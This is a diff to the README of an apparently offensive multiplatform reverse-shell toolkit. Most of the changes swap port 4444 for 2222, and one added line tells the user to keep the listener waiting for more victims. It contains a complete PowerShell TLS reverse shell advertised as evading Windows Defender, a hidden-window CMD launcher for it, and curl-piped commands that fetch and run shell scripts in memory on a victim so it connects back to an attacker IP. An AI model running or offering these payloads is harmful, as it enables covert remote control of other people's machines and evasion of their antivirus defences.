@@ -24,7 +24,7 @@ The listener generates a temporary RSA certificate in RAM (`/dev/shm`) and waits
 ```bash
 ./bash_tty.sh <port> <password>
 ```
-*Example:* `./bash_tty.sh 4444 mysecretpass`
+*Example:* `./bash_tty.sh 2222 mysecretpass`
 
 ------------------------------
 
@@ -37,14 +37,14 @@ On the target machine, provide the attacker's IP, port, and the pre-shared passw
 ```bash
 ./victim.sh <attacker_ip> <port> <password>
 ```
-*Example:* `./victim.sh 10.0.13.7 4444 mysecretpass`
+*Example:* `./victim.sh 10.0.13.7 2222 mysecretpass`
 
 ### 🪟 Windows (AV Evasive One-Liner)
 This implementation uses native .NET classes to establish a TLS tunnel. It does not touch the disk and is highly effective against Windows Defender.
 
 **Usage (Update variables at the start):**
 ```powershell
-$IP="10.0.13.7"; $P=4444; $pw="mysecretpass"; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("WINDOWS_SHELL"); $w.Close(); $c.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ $w.WriteLine("[+] TLS Auth OK"); while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }
+$IP="10.0.13.7"; $P=2222; $pw="mysecretpass"; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("WINDOWS_SHELL"); $w.Close(); $c.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ $w.WriteLine("[+] TLS Auth OK"); while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }
 ```
 
 ------------------------------
@@ -54,22 +54,23 @@ $IP="10.0.13.7"; $P=4444; $pw="mysecretpass"; $cb={ $true }; try { $c=New-Object
 ### Execution via Remote Pipe (Kali Attacker)
 Download and run the listener in memory. Ensure you provide the port and password as arguments.
 ```bash
-source <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/bash_tty.sh) 4444 mysecretpass
+source <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/bash_tty.sh) 2222 mysecretpass
 ```
 
 ### Execution via Remote Pipe (Linux Victim)
 Execute the shell directly in memory without leaving files on the disk. This keeps `stdin` open for the interactive session.
 ```bash
-bash <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh) 10.0.13.7 4444 mysecretpass
+bash <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh) 10.0.13.7 2222 mysecretpass
 ```
 
 ### Execution via CMD (Windows Victim)
 To launch the one-liner from a standard CMD or a shortcut:
 ```cmd
-powershell -nop -w hidden -c "$IP='10.0.13.7'; $P=4444; $pw='mysecretpass'; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine('WINDOWS_SHELL'); $w.Close(); $c.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ $w.WriteLine('[+] TLS Auth OK'); while($c.Connected){ $w.Write('`r`nPS '+(pwd).Path+'> '); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }"
+powershell -nop -w hidden -c "$IP='10.0.13.7'; $P=2222; $pw='mysecretpass'; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine('WINDOWS_SHELL'); $w.Close(); $c.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ $w.WriteLine('[+] TLS Auth OK'); while($c.Connected){ $w.Write('`r`nPS '+(pwd).Path+'> '); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }"
 ```
 
 ------------------------------
+## AFTER RUNNING "EXIT" IN THE ATTACKER, PRESS ENTER SO IT LISTENS FOR MORE VICTIMS AUTOMATICALLY
 
 ## ⚠️ Recovery
 If the session ends and your local terminal behaves strangely (doesn't show typing), restore it with:
